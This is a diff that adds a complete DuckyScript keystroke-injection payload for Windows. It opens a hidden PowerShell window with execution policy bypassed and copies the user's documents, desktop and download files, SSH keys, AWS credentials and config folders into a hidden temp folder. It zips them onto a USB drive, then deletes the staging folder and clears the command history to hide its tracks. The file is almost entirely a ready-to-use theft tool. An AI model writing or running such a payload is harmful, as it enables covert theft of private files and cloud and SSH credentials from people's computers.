@@ -1,0 +1,63 @@
+# ============================================
+# WINDOWS FILES QUICK - Grab Interesting Files
+# ============================================
+# Purpose: Find and copy interesting files
+# Time: 20 seconds
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+DELAY 2000
+
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 3000
+
+STRING $td = "$env:TEMP\.files"; md $td -Force
+ENTER
+DELAY 200
+
+# Find interesting files
+STRING $files = @(
+ENTER
+STRING   "$env:USERPROFILE\Documents\*.pdf",
+ENTER
+STRING   "$env:USERPROFILE\Documents\*.doc*",
+ENTER
+STRING   "$env:USERPROFILE\Documents\*.xls*",
+ENTER
+STRING   "$env:USERPROFILE\Desktop\*.*",
+ENTER
+STRING   "$env:USERPROFILE\Downloads\*.pdf",
+ENTER
+STRING   "$env:USERPROFILE\Downloads\*.zip",
+ENTER
+STRING   "$env:USERPROFILE\.ssh\*",
+ENTER
+STRING   "$env:USERPROFILE\.aws\*",
+ENTER
+STRING   "$env:USERPROFILE\.config\*"
+ENTER
+STRING )
+ENTER
+DELAY 100
+
+STRING foreach ($f in $files) { Copy-Item $f $td -Force -ErrorAction SilentlyContinue }
+ENTER
+DELAY 3000
+
+# Compress
+STRING Compress-Archive -Path "$td\*" -DestinationPath "$td\files.zip" -Force
+ENTER
+DELAY 1000
+
+# Copy to USB
+STRING if (Test-Path E:\) { Copy-Item "$td\files.zip" "E:\files.zip" -Force }
+ENTER
+DELAY 500
+
+STRING Remove-Item $td -Recurse -Force
+ENTER
+STRING Clear-History; exit
+ENTER
